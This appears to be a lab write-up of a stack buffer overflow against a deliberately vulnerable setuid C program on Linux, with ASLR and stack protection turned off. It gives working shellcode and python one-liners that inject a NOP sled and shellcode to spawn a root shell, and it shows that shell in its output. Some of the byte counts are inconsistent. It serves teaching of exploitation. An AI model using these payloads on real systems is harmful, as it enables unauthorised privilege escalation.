# Stack based buffer-overflow on Cent OS( any x84 linux OS )

Stack grows from high address to low address (while buffer grows from low - high address).

Vuln.c is a c program that has a function strcopy (buf, name) that will allow more read of bytes than the buffer size (100) from the second argument.

```python
  void func(char *name){
    char buf[100];
    strcpy(buf, name); // The following statement has a buffer overflow problem
    printf("Welcome %s\n", buf);
  }
```
The function strcpy() does not check whether the boundary of buf[] has reached. It simply copies the contents from name to buffer[] and only stops when seeing the end-of-string character ‘\0’. If the string pointed by buf has more than 100 chars, contents in the memory above buf [] will be overwritten by the characters at the end of name.  So, this leads to stack-based buffer overflow and we can overwrite anything that can come after that buffer. Thus, we know the vulnerability and we can prepare an exploit.

<b>Address space layout randomization (ASLR)</b> causes the addresses of the stack to be randomized. This causes a lot of difficulty in predicting addresses while exploitation. As ASLR is disabled we are sure that no matter how many times the binary is run, the address of buf will not change. Thus, ASLR is turned off on root first by the command:
```python
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

•	Vuln.c is compiled in root using: 
```python
gcc vuln.c -o vuln -fno-stackprotector -z execstack
```
-g tells GCC to add extra information for GDB

-fno-stackprotector is a flag to turn off stack protection mechanism

-z execstack makes the vuln file stack executable

•	I set permission of the vuln file as an executable binary that is owned by root, has the suid bit set to be user executable, and is vulnerable to buffer overflow. Mainly, it is set like this for debugging by the other user in gdb( GNU debugger).

# Procedures in GDB:
DO THESE PROCEDURES BELOW BY ANY OTHER USER THAN ROOT TO GAIN ROOT SHELL...

<b>a. Find out where the start of the buffer is in memory: </b>

```python
(gdb) print $ebp
$1 = (void *) 0xbfffeb38
(gdb) print $ebp - 0x6c
$2 = (void *) 0xbfffeacc
(gdb) quit
A debugging session is active.
```

 buf lies at ebp - 0x6c.
 0x6c is 108(100 + framept(4-current+4-prev) in decimal, Disassemble main method and it will show dump of registers. 
 Look for the part where is function call: ebp is the base of stack pointer which I will use instead of $esp. However, EBP is a pointer to the top of the stack when the func() is first called. So, I thought this as offset bytes before.

print $ebp - 0x6c will give start of the buffer.

<b>b. Fill the register with appropriate size NOP (X90)</b>

We fill the first 40 bytes with NOP instructions, constructing a NOP Sled. It makes the processor jump to the address of buf (taken from gdb’s output) minus x bytes to get somewhere in the middle of the NOP sled.

Start of buffer: 0xbfffeacc - some bytes(172- ac in hex)... 0xbfffea20(roughly I used this arbitrary bytes to get somewhere in the middle of the NOP sled)  

[ Intel CPU’ we have endian structure: \x20\xea\xff\xbf ]

The reason for inserting a NOP sled before the shellcode is that now we can transfer execution flow to anyplace within these 40 bytes. The processor will keep on executing the NOP instructions until it finds the shellcode. We need not know the exact address of the shellcode. This takes care of the problem of not knowing the address of buf exactly and increases chances of getting into our shell code.

<b>c. We can fill the rest 47 (112 - 25 - 40) bytes with random data, say the ‘A’ character. </b>

This is a part to play around & 47 As might be overestimate...And return address starts after the first 112 bytes of buf. 108 +4( roughly because I ran the debugger with 104 As)
 
 Final payload structure: [40 bytes of NOP - sled] [25 bytes of shellcode] [47 times ‘A’ will occupy 49 bytes] [4 bytes pointing in the middle of the NOP - sled: 0xbfffea20]

Prepared 25 byte long shell code which tells VM to launch a shell: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

```python
./vuln $(python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*37 + "\x20\xea\xff\xbf"')
```
( 37 As was the right amount for test run! )... Not 47. (But, try arbitrary As here)

Note that above part have code execution but not root shell access. It happens due to the protection in /bin/bash. We remove the restriction by:
setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL])
Thus, we have 37 byte shell code to gain root access:

\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80

```python
./vuln $(python -c 'print "\x90"*40 + "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "A"*27 + "\x20\xea\xff\xbf"')
Welcome ????????????????????????????????????????jX1?̀j.XS̀1?j
                                                           XRh//shh/bin??RS??̀AAAAAAAAAAAAAAAAAAAAAAAAAAA
sh-3.2# whoami
root
```
